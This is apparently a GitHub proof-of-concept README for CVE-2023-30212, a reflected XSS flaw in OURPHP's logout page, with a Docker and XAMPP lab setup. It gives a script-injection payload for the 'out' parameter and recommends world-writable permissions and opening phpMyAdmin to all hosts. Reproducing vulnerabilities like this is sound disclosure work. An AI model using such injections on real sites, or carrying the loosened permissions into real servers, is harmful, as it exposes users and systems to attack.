# CVE-2023-30212-OURPHP-Vulnerability : XSS
CVE-2023-30212 is a security vulnerability that affects versions of OURPHP prior to or equal to 7.2.0. 
This vulnerability allows for Cross-Site Scripting (XSS) attacks

# Lets Setup Docker enviornment

Use any opreating System ease of yours, am using ubuntu.
<br />
if docker is not installed in your OS, Install it using
```
apt install docker.io
```
#### Step 1
Now lest add ubuntu docker image
```
docker pull ubuntu
```
#### Step 2
Creating a Docker container

```
docker run -d -t --name ourphp -p 80:80 -p 443:443 -p 3306:3306 -p 21:21 ubuntu
```
#### Step 3
Starting Container
```
Docker run ourphp
```
#### Step 4
Accessing Docker container in Terminal
```
docker exec -it ourphp bash
```
<br /> now we got a intractive shell
#### Step 5
Update packages and Installing Dependencies
```
<br /> `apt-get update && apt-get upgrade`
<br /> `apt install wget`
<br /> `apt install net-tools`
<br /> `apt install unzip`
<br /> `apt install locate` (optional)
```
#### Step 6
Download and installing XAMPP
```
wget https://liquidtelecom.dl.sourceforge.net/project/xampp/XAMPP%20Linux/7.2.0/xampp-linux-x64-7.2.0-0-installer.run

chmod +x xampp-linux-x64-7.2.0-0-installer.run

./xampp-linux-x64-7.2.0-0-installer.run
```
#### Step 7
Starting XAMPP services
```
cd /opt/lampp

./xampp start
```
This command will start all services in XAMPP including Apache,mysql,proftp 
<br />Access `localhost/phpmyadmin` to check installed or not.

#### Step 8
Now lets Download Vulnerable version of  ourphp and clone to `htdocs`
```
wget https://zdown.chinaz.com/202305/ourphp-zyb-v7.5.0.20230515.zip

unzip ourphp-zyb-v7.5.0.20230515.zip /opt/lampp/htdocs/
```
#### Step 9
Assign permission to config Directory and all 
```
chmod -R 777 .
```
#### Step 10
Configuring Database and adding admin

![MarineGEO circle logo](https://github.com/MaThEw-ViNcEnT/CVE-2023-30212-OURPHP-Vulnerability/blob/main/upload1.png)
![MarineGEO circle logo](https://github.com/MaThEw-ViNcEnT/CVE-2023-30212-OURPHP-Vulnerability/blob/main/upload2.png)
![MarineGEO circle logo](https://github.com/MaThEw-ViNcEnT/CVE-2023-30212-OURPHP-Vulnerability/blob/main/upload3.png)

# Proof-of-Concept (POC)
Payload Code:
```
 </script><script>alert(`xss`)</script>
```

#### Steps to Reproduce
After completing the setup of the docker.

<br />1.Login as Admininstrator using Username and password as per `step 10`
<br />2.Find `Exit background` to logout as administrator
<br />3.there is url prase `http://localhost/client/manage/ourphp_out.php?ourphp_admin=logout&out=**/admin.php**` that logouts to /admin.php
<br />4.lets change /admin.php to our payload ` </script><script>alert(`xss`)</script>`
<br />5.There will a alert of XSS popup

# Video
![Video](https://img.youtube.com/vi/Yg3PK7aQjLM/0.jpg)<br />(https://www.youtube.com/watch?v=Yg3PK7aQjLM)

# Challanges Faced
<br />1.phpmyadmin was getting 403 error,an special security concept
<br />solved: when editted httpd.xampp.conf the permission `require local` to `require all granted`
<br />2.mysql database connectivity issue.
<br />Solved: Ths was causing lack of space in OS, i was in virtual box i added another OS with 150GB then it worked as fine

# Reference
<br />[code refference]https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/
<br />[NIST]https://nvd.nist.gov/vuln/detail/CVE-2023-30212
<br />[mitre]https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30212
